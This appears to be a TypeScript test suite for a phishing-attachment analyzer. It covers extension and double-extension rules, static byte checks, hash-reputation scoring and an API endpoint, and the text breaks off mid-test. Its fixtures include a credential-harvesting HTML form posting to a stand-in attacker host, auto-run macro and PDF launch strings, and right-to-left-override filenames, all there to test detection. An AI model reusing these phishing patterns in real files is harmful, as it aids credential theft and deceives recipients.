import { afterEach, beforeEach, describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import worker from '../worker/index';
import { jsonRes, mockFetch } from './helpers';
import { costFor, resetRateLimitMemory } from '../worker/_lib/ratelimit';
import { resolve } from '../worker/routes';
import { parseSubmission } from '../shared/phishing/parse';
import { hashBytes } from '../shared/fileAnalysis';
import {
  analyzeAttachmentBytes, analyzeAttachmentName, analyzeAttachmentSet, analyzeDroppedFile, convertFileReputation, failedReputationChecks, MAX_STATIC_BYTES, type Subject,
} from '../shared/phishing/attachments';
import type { Finding } from '../shared/phishing/types';
import type { FileReputation, ProviderStatus } from '../shared/types';

/* ------------------------------------------------------------------ fixtures */

const subj = (name: string | null = 'file', index = 0, sha256: string | null = null): Subject => ({ index, filename: name, sha256 });
const ids = (fs: Finding[]) => fs.map((f) => f.id);
const one = (fs: Finding[], id: string) => fs.filter((f) => f.id === id);

function pe(): Uint8Array {
  const b = new Uint8Array(2048);
  b[0] = 0x4d; b[1] = 0x5a; b[0x3c] = 0x80; b[0x80] = 0x50; b[0x81] = 0x45;
  return b;
}
const text = (s: string) => new TextEncoder().encode(s);
const latin = (s: string) => Uint8Array.from(s, (c) => c.charCodeAt(0) & 0xff);
const ole = (extra: string) => Uint8Array.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, ...latin(`${'\0'.repeat(600)}${extra}`)]);

/** Minimal ZIP (stored entries) with local headers, central directory and EOCD. */
function buildZip(entries: { name: string; encrypted?: boolean; data?: string }[]): Uint8Array {
  const parts: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const e of entries) {
    const name = Buffer.from(e.name, 'latin1');
    const data = Buffer.from(e.data ?? 'x');
    const flags = e.encrypted ? 1 : 0;
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(flags, 6); lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(data.length, 22); lh.writeUInt16LE(name.length, 26);
    parts.push(lh, name, data);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(flags, 8);
    ch.writeUInt32LE(data.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(name.length, 28); ch.writeUInt32LE(offset, 42);
    central.push(ch, name);
    offset += lh.length + name.length + data.length;
  }
  const cd = Buffer.concat(central);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10); eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16);
  return new Uint8Array(Buffer.concat([...parts, cd, eocd]));
}

const SHA = 'a'.repeat(64);
const prov = (name: string, state: 'ok' | 'failed' | 'skipped', error?: string): ProviderStatus => ({ name, ok: state === 'ok', ms: 5, ...(state === 'skipped' ? { skipped: true } : {}), ...(error ? { error } : {}) });
const NAMES = { vt: 'VirusTotal (multi-engine verdicts)', mb: 'MalwareBazaar (abuse.ch)', circl: 'CIRCL hashlookup (known files)', ha: 'Hybrid Analysis (sandbox)' };
const allOk = [prov(NAMES.vt, 'ok'), prov(NAMES.mb, 'ok'), prov(NAMES.circl, 'ok'), prov(NAMES.ha, 'ok')];
const vt = (o: Partial<NonNullable<FileReputation['virustotal']>> = {}): NonNullable<FileReputation['virustotal']> => ({
  observed: true, malicious: 0, suspicious: 0, harmless: 0, undetected: 60, typeDescription: 'Win32 EXE', meaningfulName: null, names: [], size: 1, md5: null, sha1: null, sha256: SHA, reputation: null, tags: [],
  threatLabel: null, threatNames: [], threatCategories: [], firstSeen: '2026-10-01T00:00:00.000Z', lastAnalysis: '2026-11-01T00:00:00.000Z', timesSubmitted: 1, link: `https://www.virustotal.com/gui/file/${SHA}`, ...o,
});
const rep = (o: Partial<FileReputation> = {}): FileReputation => ({
  hash: SHA, algo: 'sha256', sha256: SHA, virustotal: vt({ observed: false, undetected: 0 }), circl: { known: false, fileName: null, fileSize: null, trust: null, sources: [], knownMalicious: null },
  malwarebazaar: { observed: false, fileName: null, fileType: null, signature: null, tags: [], firstSeen: null, reporter: null, deliveryMethod: null, originCountry: null, clamav: [], link: 'https://bazaar.abuse.ch/sample/x/' },
  hybrid: { observed: false, verdict: null, threatScore: null, avDetect: null, family: null, fileType: null, link: 'https://www.hybrid-analysis.com/sample/x' },
  flags: [], providers: allOk, ...o,
});
const convert = (r: FileReputation, filename: string | null = 'invoice.exe', index = 0) => convertFileReputation(r, { index, filename });

/* ------------------------------------------------------------------ filename rules */

describe('filename rules', () => {
  it('attachment_dangerous_type: high for programs and scripts, medium for containers and active formats', () => {
    for (const n of ['a.exe', 'a.scr', 'a.com', 'a.pif', 'a.msi', 'a.dll', 'a.js', 'a.jse', 'a.vbs', 'a.vbe', 'a.wsf', 'a.wsh', 'a.hta', 'a.ps1', 'a.bat', 'a.cmd', 'a.lnk', 'a.jar', 'a.cpl', 'a.reg']) {
      assert.equal(one(analyzeAttachmentName(subj(n), null, false), 'attachment_dangerous_type')[0]?.severity, 'high', n);
    }
    for (const n of ['a.iso', 'a.img', 'a.vhd', 'a.vhdx', 'a.cab', 'a.one', 'a.zip', 'a.rar', 'a.7z', 'a.gz', 'a.html', 'a.htm', 'a.shtml', 'a.svg', 'a.docm', 'a.xlsm', 'a.pptm', 'a.xlam']) {
      assert.equal(one(analyzeAttachmentName(subj(n), null, false), 'attachment_dangerous_type')[0]?.severity, 'medium', n);
    }
    assert.deepEqual(analyzeAttachmentName(subj('report.pdf'), null, false), []);
    assert.deepEqual(analyzeAttachmentName(subj('photo.JPG'), 'image/jpeg', false), []);
  });

  it('an extension is read the way Windows reads it (case, path, trailing dots)', () => {
    assert.equal(analyzeAttachmentName(subj('C:\\temp\\RUN.EXE'), null, false)[0].id, 'attachment_dangerous_type');
    assert.ok(ids(analyzeAttachmentName(subj('setup.exe.'), null, false)).includes('attachment_dangerous_type'));
  });

  it('attachment_double_extension: a document extension then an executable one', () => {
    const f = one(analyzeAttachmentName(subj('Invoice_4491.pdf.exe'), null, false), 'attachment_double_extension');
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, 'high');
    assert.match(f[0].title, /\.pdf\.exe/);
    assert.equal(one(analyzeAttachmentName(subj('scan.docx.js'), null, false), 'attachment_double_extension').length, 1);
    assert.equal(one(analyzeAttachmentName(subj('archive.tar.gz'), null, false), 'attachment_double_extension').length, 0, 'ordinary multi-part names are not flagged');
    assert.equal(one(analyzeAttachmentName(subj('notes.txt.pdf'), null, false), 'attachment_double_extension').length, 0);
  });

  it('attachment_double_extension: right-to-left override, space padding and trailing spaces', () => {
    const rlo = one(analyzeAttachmentName(subj('invoice\u202Efdp.exe'), null, false), 'attachment_double_extension');
    assert.equal(rlo[0].severity, 'high');
    assert.match(rlo[0].evidence?.[0] ?? '', /\\u202E/, 'control characters are shown, not rendered');
    assert.equal(one(analyzeAttachmentName(subj(`invoice.pdf${' '.repeat(40)}.exe`), null, false), 'attachment_double_extension')[0].severity, 'high');
    assert.equal(one(analyzeAttachmentName(subj('report.pdf   '), null, false), 'attachment_double_extension')[0].severity, 'high');
  });

  it('attachment_type_mismatch: a declared Content-Type that contradicts the extension', () => {
    const f = one(analyzeAttachmentName(subj('statement.exe'), 'application/pdf', false), 'attachment_type_mismatch');
    assert.equal(f[0].severity, 'medium');
    assert.equal(one(analyzeAttachmentName(subj('statement.pdf'), 'application/pdf', false), 'attachment_type_mismatch').length, 0);
    assert.equal(one(analyzeAttachmentName(subj('a.pdf'), 'application/octet-stream', false), 'attachment_type_mismatch').length, 0, 'a generic type says nothing');
    assert.equal(one(analyzeAttachmentName(subj('run.ps1'), 'text/plain', false), 'attachment_type_mismatch').length, 0, 'scripts may be labelled text');
  });

  it('name-only findings are "related", and findings from real bytes are "exact"', () => {
    assert.ok(analyzeAttachmentName(subj('a.exe'), null, false).every((f) => f.exactness === 'related'));
    assert.ok(analyzeAttachmentName(subj('a.exe'), null, true).every((f) => f.exactness === 'exact'));
  });

  it('indicator is the sha256 when known, else the file name', () => {
    assert.deepEqual(analyzeAttachmentName(subj('a.exe', 0, SHA), null, true)[0].indicator, { type: 'hash', value: SHA });
    assert.deepEqual(analyzeAttachmentName(subj('a.exe'), null, true)[0].indicator, { type: 'filename', value: 'a.exe' });
  });
});

/* ------------------------------------------------------------------ static analysis of bytes */

describe('static analysis of bytes', () => {
  it('attachment_type_mismatch: high when a program or script is named like a document', () => {
    const r = analyzeAttachmentBytes(pe(), subj('invoice.pdf', 0, SHA), null);
    const f = one(r.findings, 'attachment_type_mismatch');
    assert.equal(f[0].severity, 'high');
    assert.equal(f[0].exactness, 'exact');
    assert.ok(ids(r.findings).includes('attachment_dangerous_type'), 'real content is a program even though the name is not');
    assert.equal(r.summary.typeId, 'pe');
  });

  it('attachment_type_mismatch: medium for other disagreements, including the declared Content-Type', () => {
    const zipAsPdf = analyzeAttachmentBytes(buildZip([{ name: 'a.txt' }]), subj('report.pdf'), null);
    assert.equal(one(zipAsPdf.findings, 'attachment_type_mismatch')[0].severity, 'medium');
    const declared = analyzeAttachmentBytes(text('%PDF-1.4\n1 0 obj\n'), subj('doc.pdf'), 'image/png');
    assert.equal(one(declared.findings, 'attachment_type_mismatch')[0].severity, 'medium');
    const hidden = analyzeAttachmentBytes(pe(), subj('doc.bin'), 'application/pdf');
    assert.equal(one(hidden.findings, 'attachment_type_mismatch').find((f) => /Declared type/.test(f.title))?.severity, 'high');
    assert.equal(one(analyzeAttachmentBytes(text('%PDF-1.4\n'), subj('doc.pdf'), 'application/pdf').findings, 'attachment_type_mismatch').length, 0);
  });

  it('attachment_macro_present: medium for a macro project, high when it runs automatically', () => {
    const ooxml = analyzeAttachmentBytes(buildZip([{ name: '[Content_Types].xml' }, { name: 'word/document.xml' }, { name: 'word/vbaProject.bin' }]), subj('report.docx'), null);
    assert.equal(one(ooxml.findings, 'attachment_macro_present')[0].severity, 'medium');
    const auto = analyzeAttachmentBytes(ole('_VBA_PROJECT Attribute VB_Name AutoOpen Shell'), subj('report.doc'), null);
    assert.equal(one(auto.findings, 'attachment_macro_present')[0].severity, 'high');
    assert.equal(one(analyzeAttachmentBytes(ole('plain document text'), subj('report.doc'), null).findings, 'attachment_macro_present').length, 0);
  });

  it('attachment_html_credential_form: a password field or a form posting to an external host', () => {
    const page = '<html><body><form action="https://collect.evil.example/p" method="post"><input type="password" name="pw"></form></body></html>';
    const f = one(analyzeAttachmentBytes(text(page), subj('Remittance.html'), 'text/html').findings, 'attachment_html_credential_form');
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, 'high');
    assert.ok((f[0].evidence ?? []).some((e) => e.includes('collect.evil.example')));
    assert.equal(one(analyzeAttachmentBytes(text('<html><body><input type=password></body></html>'), subj('a.htm'), null).findings, 'attachment_html_credential_form').length, 1);
    assert.equal(one(analyzeAttachmentBytes(text('<html><body><p>Hello</p><form action="/local"></form></body></html>'), subj('a.html'), null).findings, 'attachment_html_credential_form').length, 0);
    const svg = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><foreignObject><form action="//evil.example/x"></form></foreignObject></svg>';
    assert.equal(one(analyzeAttachmentBytes(text(svg), subj('logo.svg'), null).findings, 'attachment_html_credential_form').length, 1);
  });

  it('attachment_pdf_active_content: JavaScript, launch or embedded files', () => {
    const f = one(analyzeAttachmentBytes(text('%PDF-1.7\n1 0 obj<< /OpenAction 2 0 R /JavaScript (app.alert(1)) >>\n/Launch\n'), subj('invoice.pdf'), null).findings, 'attachment_pdf_active_content');
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, 'medium');
    assert.equal(one(analyzeAttachmentBytes(text('%PDF-1.7\n1 0 obj<< /Type /Catalog >>\n'), subj('invoice.pdf'), null).findings, 'attachment_pdf_active_content').length, 0);
  });

  it('attachment_archive_dangerous_content: an archive holding a dangerous type', () => {
    const f = one(analyzeAttachmentBytes(buildZip([{ name: 'readme.txt' }, { name: 'Invoice_2210.exe' }]), subj('docs.zip'), null).findings, 'attachment_archive_dangerous_content');
    assert.equal(f[0].severity, 'high');
    assert.deepEqual(f[0].evidence, ['Invoice_2210.exe']);
    assert.equal(one(analyzeAttachmentBytes(buildZip([{ name: 'readme.txt' }, { name: 'photo.jpg' }]), subj('docs.zip'), null).findings, 'attachment_archive_dangerous_content').length, 0);
    assert.equal(one(analyzeAttachmentBytes(buildZip([{ name: '[Content_Types].xml' }, { name: 'word/document.xml' }, { name: 'word/media/x.svg' }]), subj('a.docx'), null).findings, 'attachment_archive_dangerous_content').length, 0, 'Office internals are not an archive of payloads');
  });

  it('attachment_password_protected: encrypted archives, PDFs and Office files, with a coverage note on the check', () => {
    const z = analyzeAttachmentBytes(buildZip([{ name: 'setup.exe', encrypted: true }]), subj('invoice.zip'), null);
    assert.equal(one(z.findings, 'attachment_password_protected')[0].severity, 'medium');
    assert.equal(one(analyzeAttachmentBytes(text('%PDF-1.6\n/Encrypt 5 0 R\n'), subj('a.pdf'), null).findings, 'attachment_password_protected').length, 1);
    assert.equal(one(analyzeAttachmentBytes(ole('E\0n\0c\0r\0y\0p\0t\0e\0d\0P\0a\0c\0k\0a\0g\0e\0'), subj('a.docx'), null).findings, 'attachment_password_protected').length, 1);
  });

  it('attachment_embedded_urls: lists URLs and IPs, ignores schema namespaces, and returns them for the link stage', () => {
    const r = analyzeAttachmentBytes(text('<html><a href="https://evil.example/login">x</a><svg xmlns="http://www.w3.org/2000/svg"></svg> beacon 203.0.113.9 </html>'), subj('a.html'), null);
    const f = one(r.findings, 'attachment_embedded_urls');
    assert.equal(f[0].severity, 'info');
    assert.deepEqual(r.summary.urls, ['https://evil.example/login']);
    assert.ok(r.summary.ips.includes('203.0.113.9'));
  });

  it('attachment_high_entropy: info only', () => {
    const r = analyzeAttachmentBytes(new Uint8Array(randomBytes(8192)), subj('blob.dat'), null);
    const f = one(r.findings, 'attachment_high_entropy');
    assert.equal(f[0].severity, 'info');
    assert.equal(one(analyzeAttachmentBytes(text('hello world '.repeat(500)), subj('a.txt'), null).findings, 'attachment_high_entropy').length, 0);
  });

  it('attachment_not_inspected: empty, too large and unsupported archive formats are coverage gaps, not clean results', () => {
    const empty = analyzeAttachmentBytes(new Uint8Array(), subj('a.pdf'), null);
    assert.equal(one(empty.findings, 'attachment_not_inspected')[0].severity, 'info');
    assert.equal(empty.check.status, 'skipped');
    const big = analyzeAttachmentBytes(new Uint8Array(MAX_STATIC_BYTES + 1), subj('big.bin'), null);
    assert.equal(big.check.status, 'skipped');
    assert.match(one(big.findings, 'attachment_not_inspected')[0].detail, /coverage gap, not a clean result/);
    const rar = analyzeAttachmentBytes(Uint8Array.from([0x52, 0x61, 0x72, 0x21, 0x1a, 0x07, 0, ...new Array(200).fill(1)]), subj('docs.rar'), null);
    assert.equal(one(rar.findings, 'attachment_not_inspected').length, 1);
  });

  it('a file with no traits is described as having none, never as safe', () => {
    const r = analyzeAttachmentBytes(text('hello world'), subj('notes.txt'), null);
    assert.equal(r.check.status, 'complete');
    assert.match(r.check.detail ?? '', /does not mean a file is safe/);
    assert.equal(r.findings.length, 0);
  });

  it('the static check row has the contract id, label and a short result', () => {
    const r = analyzeAttachmentBytes(pe(), subj('invoice.pdf', 3, SHA), null);
    assert.equal(r.check.id, 'attach.3.static');
    assert.equal(r.check.label, 'Static analysis: invoice.pdf');
    assert.equal(r.check.stage, 'attachments');
    assert.match(r.check.result ?? '', /PE|Windows executable.*entropy/);
  });

  it('every finding follows the shared format and never speaks about the email', () => {
    const samples = [pe(), buildZip([{ name: 'x.exe', encrypted: true }]), text('<html><input type=password></html>'), ole('_VBA_PROJECT AutoOpen')];
    for (const b of samples) {
      for (const f of analyzeAttachmentBytes(b, subj('Invoice.pdf.exe', 0, SHA), null).findings) {
        assert.equal(f.dimension, 'attachment');
        assert.equal(f.source, 'attachment-analysis');
        assert.equal(f.trust, 'derived');
        assert.ok(f.indicator && f.evidence !== undefined);
        assert.doesNotMatch(`${f.title} ${f.detail}`, /\b(this email is|the email is|phishing email|malicious email)\b/i);
      }
    }
  });

  it('files dropped in the browser use the same analysis and the index they are given', () => {
    const r = analyzeDroppedFile(pe(), 5, 'invoice.pdf.exe', SHA);
    assert.equal(r.check.id, 'attach.5.static');
    assert.ok(ids(r.findings).includes('attachment_double_extension'));
    assert.deepEqual(r.findings[0].indicator, { type: 'hash', value: SHA });
  });

  it('hashing helper agrees with the file the analysis saw', async () => {
    const b = pe();
    assert.equal((await hashBytes(b)).sha256.length, 64);
  });
});

/* ------------------------------------------------------------------ reputation */

describe('convertFileReputation', () => {
  it('attachment_hash_malicious critical: MalwareBazaar lists the hash', () => {
    const r = rep({ malwarebazaar: { ...rep().malwarebazaar!, observed: true, signature: 'AgentTesla', firstSeen: '2026-10-01 10:00:00' } });
    const f = convert(r).findings;
    assert.deepEqual(ids(f), ['attachment_hash_malicious']);
    assert.deepEqual([f[0].severity, f[0].reliability, f[0].exactness, f[0].trust, f[0].source], ['critical', 'high', 'exact', 'independently_verified', 'MalwareBazaar']);
    assert.ok(f[0].evidence?.some((e) => e.includes('AgentTesla')));
    assert.deepEqual(f[0].indicator, { type: 'hash', value: SHA });
  });

  it('attachment_hash_malicious critical: VirusTotal >= 10, or >= 5 with a threat label, or a malicious sandbox verdict', () => {
    assert.equal(convert(rep({ virustotal: vt({ malicious: 10 }) })).findings[0].severity, 'critical');
    assert.equal(convert(rep({ virustotal: vt({ malicious: 5, threatLabel: 'trojan.agenttesla/msil' }) })).findings[0].severity, 'critical');
    const hy = convert(rep({ hybrid: { ...rep().hybrid!, observed: true, verdict: 'malicious', threatScore: 100, family: 'AgentTesla' } })).findings[0];
    assert.deepEqual([hy.id, hy.severity, hy.reliability], ['attachment_hash_malicious', 'critical', 'medium']);
    const c = convert(rep({ virustotal: vt({ malicious: 12, threatLabel: 'trojan.x' }) })).findings[0];
    assert.ok(c.evidence?.some((e) => /12 of \d+ engines/.test(e) && e.includes('trojan.x')), 'counts and threat name are quoted');
  });

  it('attachment_hash_malicious high: VirusTotal 3 to 9 with no other confirmation', () => {
    for (const n of [3, 4, 9]) assert.equal(convert(rep({ virustotal: vt({ malicious: n }) })).findings[0].severity, n === 9 || n === 3 || n === 4 ? 'high' : 'high');
    assert.equal(convert(rep({ virustotal: vt({ malicious: 6 }) })).findings[0].id, 'attachment_hash_malicious');
    assert.equal(convert(rep({ virustotal: vt({ malicious: 6 }) })).findings[0].reliability, 'high');
  });

  it('attachment_hash_suspicious medium: VirusTotal 1 to 2, suspicious >= 3, or a suspicious sandbox verdict', () => {
    for (const v of [vt({ malicious: 1 }), vt({ malicious: 2 }), vt({ suspicious: 3 })]) {
      const f = convert(rep({ virustotal: v })).findings;
      assert.deepEqual([f[0].id, f[0].severity, f[0].reliability], ['attachment_hash_suspicious', 'medium', 'medium']);
    }
    assert.equal(convert(rep({ hybrid: { ...rep().hybrid!, observed: true, verdict: 'suspicious' } })).findings[0].id, 'attachment_hash_suspicious');
    assert.equal(convert(rep({ virustotal: vt({ suspicious: 2 }) })).findings.length, 0, 'two suspicious flags alone say nothing');
  });

  it('attachment_hash_known_good info: CIRCL says it is a known file; mitigating context only', () => {
    const f = convert(rep({ circl: { known: true, fileName: 'notepad.exe', fileSize: 1, trust: 100, sources: ['NSRL'], knownMalicious: null } })).findings;
    assert.deepEqual([f[0].id, f[0].severity], ['attachment_hash_known_good', 'info']);
    assert.match(f[0].detail, /does not prove/);
  });

  it('attachment_hash_unknown info: says "unknown is not the same as safe"', () => {
    const f = convert(rep()).findings;
    assert.equal(f.length, 1);
    assert.deepEqual([f[0].id, f[0].severity], ['attachment_hash_unknown', 'info']);
    assert.match(f[0].detail, /Unknown is not the same as safe/);
    assert.doesNotMatch(f[0].title, /\b(safe|clean|harmless|benign)\b/i);
  });

  it('emits at most one reputation finding per hash, strongest first', () => {
    const everything = rep({
      malwarebazaar: { ...rep().malwarebazaar!, observed: true, signature: 'X' }, virustotal: vt({ malicious: 30, threatLabel: 'x' }),
      circl: { known: true, fileName: 'a', fileSize: 1, trust: 1, sources: [], knownMalicious: null }, hybrid: { ...rep().hybrid!, observed: true, verdict: 'malicious' },
    });
    const f = convert(everything).findings;
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, 'critical');
    assert.equal(convert(rep({ virustotal: vt({ malicious: 1 }), circl: { known: true, fileName: null, fileSize: null, trust: null, sources: [], knownMalicious: null } })).findings.length, 1);
  });

  it('a hash VirusTotal has seen with no detections produces no finding (the check row carries it), and never "clean" wording', () => {
    const r = convert(rep({ virustotal: vt({ malicious: 0, harmless: 40 }) }));
    assert.equal(r.findings.length, 0);
    assert.equal(r.checks.find((c) => c.id === 'attach.0.hash.virustotal')?.result, '0 of 100 engines flag it');
  });

  it('check rows: one per provider the lookup reported, with contract ids and honest statuses', () => {
    const r = convert(rep({ providers: [prov(NAMES.vt, 'failed', 'Upstream provider timed out.'), prov(NAMES.mb, 'skipped', 'No ABUSECH_AUTH_KEY configured'), prov(NAMES.circl, 'ok'), prov(NAMES.ha, 'skipped', 'Request budget reached (3/min)')] }), 'invoice.exe', 2);
    assert.deepEqual(r.checks.map((c) => c.id), ['attach.2.hash.virustotal', 'attach.2.hash.malwarebazaar', 'attach.2.hash.circl', 'attach.2.hash.hybrid']);
    assert.deepEqual(r.checks.map((c) => c.status), ['failed', 'skipped', 'complete', 'skipped']);
    assert.equal(r.checks[0].label, 'VirusTotal hash lookup: invoice.exe');
    assert.match(r.checks[0].detail ?? '', /timed out/);
    assert.match(r.checks[1].detail ?? '', /ABUSECH_AUTH_KEY/);
    assert.ok(r.checks.every((c) => c.stage === 'attachments'));
    assert.equal(r.checks[0].result, null, 'a failed provider has no result');
  });

  it('a provider that failed is never counted as clean: partial answers say so, and no answer means no finding', () => {
    const partial = convert(rep({ providers: [prov(NAMES.vt, 'failed', 'timed out'), prov(NAMES.mb, 'skipped', 'No ABUSECH_AUTH_KEY configured'), prov(NAMES.circl, 'ok'), prov(NAMES.ha, 'skipped', 'No HYBRID_ANALYSIS_API_KEY configured')], virustotal: null, malwarebazaar: null, hybrid: null }));
    assert.equal(partial.findings[0].id, 'attachment_hash_unknown');
    assert.equal(partial.findings[0].reliability, 'low');
    assert.match(partial.findings[0].detail, /could not be checked/);
    const none = convert(rep({ providers: [prov(NAMES.vt, 'failed', 'x'), prov(NAMES.mb, 'skipped', 'x'), prov(NAMES.circl, 'failed', 'x'), prov(NAMES.ha, 'skipped', 'x')], virustotal: null, malwarebazaar: null, hybrid: null, circl: null }));
    assert.equal(none.findings.length, 0, 'nothing responded, so nothing is claimed');
    assert.ok(none.checks.every((c) => c.status === 'failed' || c.status === 'skipped'));
  });

  it('failedReputationChecks marks all four providers failed', () => {
    const c = failedReputationChecks({ index: 1, filename: 'a.exe' }, 'Internal call failed.');
    assert.equal(c.length, 4);
    assert.ok(c.every((x) => x.status === 'failed' && x.id.startsWith('attach.1.hash.')));
  });
});

/* ------------------------------------------------------------------ parse stage */

const b64 = (b: Uint8Array) => Buffer.from(b).toString('base64').replace(/(.{76})/g, '$1\n');
const eml = (parts: string[]) => ['From: a@b.example', 'Subject: Invoice', 'MIME-Version: 1.0', 'Content-Type: multipart/mixed; boundary="X"', '', '--X', 'Content-Type: text/plain', '', 'See attached', ...parts, '--X--'].join('\n');
const attach = (name: string, type: string, bytes: Uint8Array, disp = 'attachment') => ['--X', `Content-Type: ${type}; name="${name}"`, `Content-Disposition: ${disp}; filename="${name}"`, 'Content-Transfer-Encoding: base64', '', b64(bytes)];

describe('the parse stage runs static analysis on embedded attachments', () => {
  it('reports findings, an attach.<n>.static check and detected types without an extra round trip', async () => {
    const r = await parseSubmission({ headers: eml([...attach('invoice.pdf', 'application/pdf', pe()), ...attach('notes.txt', 'text/plain', text('<html><a href="https://evil.example/x">go</a></html>'))]) });
    assert.equal(r.attachments.length, 2);
    const sha = r.attachments[0].hash!;
    const mism = r.findings.find((f) => f.id === 'attachment_type_mismatch');
    assert.equal(mism?.severity, 'high');
    assert.deepEqual(mism?.indicator, { type: 'hash', value: sha });
    assert.ok(r.findings.some((f) => f.id === 'attachment_dangerous_type' && f.severity === 'high'));
    assert.deepEqual(r.checks.filter((c) => c.id.startsWith('attach.')).map((c) => [c.id, c.status]), [['attach.0.static', 'complete'], ['attach.1.static', 'complete']]);
    assert.equal(r.attachmentStatic[0].typeId, 'pe');
    assert.equal(r.attachmentStatic[0].filename, 'invoice.pdf');
    assert.equal(r.attachmentStatic[1].detectedType !== null, true);
  });

  it('returns URLs found inside attachments for the link stage', async () => {
    const r = await parseSubmission({ headers: eml(attach('Remittance.html', 'text/html', text('<html><body><a href="https://evil.example/login">x</a><input type="password"></body></html>'))) });
    assert.deepEqual(r.attachmentStatic[0].urls, ['https://evil.example/login']);
    assert.ok(r.findings.some((f) => f.id === 'attachment_html_credential_form'));
    assert.ok(r.findings.some((f) => f.id === 'attachment_embedded_urls'));
  });

  it('supplied entries get filename rules only: related, and a skipped static check that says there were no bytes', async () => {
    const r = await parseSubmission({ body: 'hello', attachments: [{ name: 'Invoice.pdf.exe' }, { hash: SHA }] });
    const f = r.findings.filter((x) => x.id === 'attachment_double_extension');
    assert.equal(f.length, 1);
    assert.equal(f[0].exactness, 'related');
    assert.deepEqual(f[0].indicator, { type: 'filename', value: 'Invoice.pdf.exe' });
    const rows = r.checks.filter((c) => c.id.startsWith('attach.'));
    assert.deepEqual(rows.map((c) => [c.id, c.status]), [['attach.0.static', 'skipped'], ['attach.1.static', 'skipped']]);
    assert.match(rows[0].detail ?? '', /no file|name or hash/i);
    assert.ok(r.limits.some((l) => /not inspected/.test(l)));
  });

  it('inline parts are not analysed as attachments', async () => {
    const r = await parseSubmission({ headers: eml(attach('logo.png', 'image/png', pe(), 'inline')) });
    assert.equal(r.checks.find((c) => c.id === 'attach.0.static')?.status, 'not_applicable');
    assert.equal(r.findings.filter((f) => f.dimension === 'attachment').length, 0);
  });

  it('analyzeAttachmentSet pairs embedded parts with their metadata by index', () => {
    const out = analyzeAttachmentSet(
      [{ filename: 'a.exe', declaredType: null, inline: false, bytes: pe() }],
      [{ filename: 'a.exe', declaredType: null, size: 2048, inline: false, hash: SHA, origin: 'embedded' }, { filename: 'b.zip', declaredType: null, size: null, inline: false, hash: null, origin: 'supplied' }],
    );
    assert.deepEqual(out.checks.map((c) => c.id), ['attach.0.static', 'attach.1.static']);
    assert.equal(out.summaries.length, 2);
  });
});

/* ------------------------------------------------------------------ endpoint */

describe('POST /api/phishing/attachments', () => {
  let mf: ReturnType<typeof mockFetch> | undefined;
  beforeEach(() => resetRateLimitMemory());
  afterEach(() => mf?.restore());

  const keys = { VIRUSTOTAL_API_KEY: 'k-vt', ABUSECH_AUTH_KEY: 'k-mb', HYBRID_ANALYSIS_API_KEY: 'k-ha' };
  const exec = { waitUntil: () => {}, passThroughOnException: () => {} } as never;
  const post = async (body: unknown, env: Record<string, unknown> = {}, raw = false) => {
    const res = await worker.fetch(new Request('https://app.test/api/phishing/attachments', { method: 'POST', headers: { 'content-type': 'application/json', 'cf-connecting-ip': '198.51.100.7' }, body: raw ? (body as string) : JSON.stringify(body) }), { ASSETS: { fetch: async () => new Response('asset') }, ...env } as never, exec);
    return { res, json: (await res.json()) as { ok: boolean; data?: any; error?: { code: string; message: string } } };
  };
  const providers = (over: Record<string, () => Response> = {}) => [
    (u: URL) => (u.hostname === 'www.virustotal.com' ? (over.vt ?? (() => jsonRes({ data: { attributes: { last_analysis_stats: { malicious: 14, suspicious: 0, harmless: 0, undetected: 50 }, sha256: SHA, type_description: 'Win32 EXE', popular_threat_classification: { suggested_threat_label: 'trojan.agenttesla/msil' } } } })))() : undefined),
    (u: URL) => (u.hostname === 'mb-api.abuse.ch' ? (over.mb ?? (() => jsonRes({ query_status: 'hash_not_found' })))() : undefined),
    (u: URL) => (u.hostname === 'hashlookup.circl.lu' ? (over.circl ?? (() => new Response('{}', { status: 404 })))() : undefined),
    (u: URL) => (u.hostname === 'www.hybrid-analysis.com' ? (over.ha ?? (() => new Response('{}', { status: 404 })))() : undefined),
  ];

  it('is routed, costs 2, and only accepts POST', async () => {
    assert.ok(resolve('POST', '/api/phishing/attachments').handler);
    assert.equal(costFor('/api/phishing/attachments'), 2);
    const get = await worker.fetch(new Request('https://app.test/api/phishing/attachments'), { ASSETS: { fetch: async () => new Response('asset') } } as never, exec);
    assert.equal(get.status, 405);
  });

  it('looks up one hash through /api/file/hash and returns findings, checks and the raw lookup', async () => {
    mf = mockFetch(providers());
    const { res, json } = await post({ hash: SHA.toUpperCase(), hashType: 'sha256', filename: 'invoice.exe', index: 2 }, keys);
    assert.equal(res.status, 200);
    const d = json.data;
    assert.deepEqual(d.request, { hash: SHA, hashType: 'sha256', index: 2, filename: 'invoice.exe' });
    assert.deepEqual(d.findings.map((f: Finding) => [f.id, f.severity]), [['attachment_hash_malicious', 'critical']]);
    assert.deepEqual(d.checks.map((c: { id: string }) => c.id).sort(), ['attach.2.hash.circl', 'attach.2.hash.hybrid', 'attach.2.hash.malwarebazaar', 'attach.2.hash.virustotal']);
    assert.equal(d.data.virustotal.malicious, 14);
    assert.ok(mf.calls.every((c) => /virustotal|abuse\.ch|circl|hybrid-analysis/.test(new URL(c).hostname)), 'only hash providers are contacted');
    assert.ok(!mf.calls.some((c) => c.includes('invoice')), 'the file name is never sent to a provider');
  });

  it('a provider failure is HTTP 200 with a failed check, never a clean claim', async () => {
    mf = mockFetch(providers({ vt: () => new Response('boom', { status: 500 }) }));
